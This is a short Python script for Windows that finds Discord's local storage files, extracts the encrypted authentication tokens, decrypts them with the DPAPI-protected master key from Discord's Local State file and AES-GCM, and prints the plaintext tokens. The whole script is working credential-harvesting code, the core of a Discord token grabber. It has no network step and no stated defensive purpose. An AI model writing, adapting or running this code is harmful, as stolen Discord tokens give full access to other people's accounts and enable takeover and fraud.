
from os import environ, listdir
from os.path import exists
from sys import exit
from re import findall
from base64 import b64decode
from Crypto.Cipher import AES
from json import loads
from win32crypt import CryptUnprotectData

path = rf'{environ["APPDATA"]}\discord\Local Storage\leveldb'
path_masterkey = rf'{environ["APPDATA"]}\discord\Local State'
regexpath_encrypted = r"dQw4w9WgXcQ:[^\"]*"

if not exists(path):
    exit()

token_list = []

for file in listdir(path):
    if not file.endswith(".ldb") and not file.endswith(".log"):
        continue

    with open(rf'{path}\{file}', errors='ignore') as f:
        lines = f.read().splitlines()

    for line in lines:
        for encrypted_token in findall(regexpath_encrypted, line):

            plaintext_token = b64decode(encrypted_token.split('dQw4w9WgXcQ:')[1])

            with open(path_masterkey, "r", encoding="utf-8") as f:
                local_state_content = f.read()
            json_local_state = loads(local_state_content)

            master_key = b64decode(json_local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

            iv = plaintext_token[3:15]
            payload = plaintext_token[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            token = decrypted_pass[:-16].decode()

            token_list.append(token)

print("\nHere is a list of locally saved Discord Tokens:\n ")
for token in token_list:
    print(token)
